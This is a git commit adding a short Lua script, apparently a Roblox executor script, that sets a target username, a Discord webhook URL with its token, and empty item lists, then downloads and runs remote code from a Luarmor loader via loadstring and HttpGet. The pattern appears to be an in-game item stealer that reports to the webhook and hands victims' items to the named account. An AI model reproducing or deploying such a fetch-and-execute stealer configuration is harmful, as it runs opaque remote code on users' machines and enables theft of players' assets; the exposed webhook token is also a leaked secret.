34f301c84b0fecf3fbbdf9b7bfdc437a2dc190c2
sab-api <carlosignaa2019@gmail.com>
2026-08-08 05:02:53 -0400

    Add script Extreexmaoers_1786179773444.lua

---
+++ scripts/Extreexmaoers_1786179773444.lua
@@ -0,0 +1,10 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "nothing_67854"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1532243730214686782/DY4ZQCGqd5WN-vE2AfI9VaklXug2ZzOyBapAh_U9HpMxibw-H1hX83xH8__mvUJH6xuo"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {}
+getgenv().NORMAL_GEARS = {}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
